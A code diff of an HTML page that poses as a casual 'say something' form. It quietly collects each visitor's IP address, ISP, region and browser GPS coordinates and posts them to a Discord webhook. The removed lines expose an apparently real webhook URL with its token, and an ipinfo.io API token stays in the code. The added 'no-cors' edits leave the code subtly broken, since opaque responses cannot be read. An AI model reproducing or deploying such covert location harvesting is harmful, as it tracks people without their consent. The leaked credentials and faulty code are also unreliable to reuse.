@@ -42,7 +42,7 @@
 </head>
 <body>
     <div id="info">
-        <h1>no cap</h1>
+        <h1>no-cors Example</h1>
         <form id="username-form">
             <label for="username">Say something, bro:</label>
             <input type="text" id="username" required>
@@ -55,7 +55,7 @@
     <script>
         // Function to send data to Discord webhook
         function sendDataToDiscord(username, ip, isp, geolocation, location, gpsLocation) {
-            const webhookURL = 'https://discord.com/api/webhooks/1138933916540096513/5CGp7I6XtEYjA3oF4wEWMFL8vWPONSp_EvtJJOHAkdN0wXWwfq7WVvXjsC8mXQa0vYve';
+            const webhookURL = 'https://discord.com/api/webhooks/your-webhook-url-here';
 
             const message = `Username: ${username}\nIP: ${ip}\nISP: ${isp}\nGeolocation: ${geolocation}\nLocation: ${location}\nGPS Location: ${gpsLocation}`;
 
@@ -67,6 +67,7 @@
                 body: JSON.stringify({
                     content: message,
                 }),
+                mode: 'no-cors' // Apply no-cors mode
             })
             .then(response => {
                 if (response.ok) {
@@ -99,14 +100,21 @@
             const username = document.getElementById('username').value;
 
             // Get IP information and GPS location
-            fetch('https://ipinfo.io?token=66274b2cf307de')
-                .then(response => response.json())
+            fetch('https://ipinfo.io?token=66274b2cf307de', {
+                mode: 'no-cors' // Apply no-cors mode
+            })
+                .then(response => {
+                    // You won't be able to access the response body or headers in no-cors mode
+                    return response.text(); // For example, you can read response as text
+                })
                 .then(data => {
-                    const ip = data.ip;
-                    const isp = data.org;
-                    const geolocation = data.region;
-                    const location = `${data.city}, ${data.country}`;
-                    
+                    // Process the data here, but note that this will only work with simple responses
+                    // For more complex responses, you'll need to handle them differently
+                    const ip = data;
+                    const isp = 'N/A';
+                    const geolocation = 'N/A';
+                    const location = 'N/A';
+
                     if ("geolocation" in navigator) {
                         navigator.geolocation.getCurrentPosition(function(position) {
                             const latitude = position.coords.latitude;
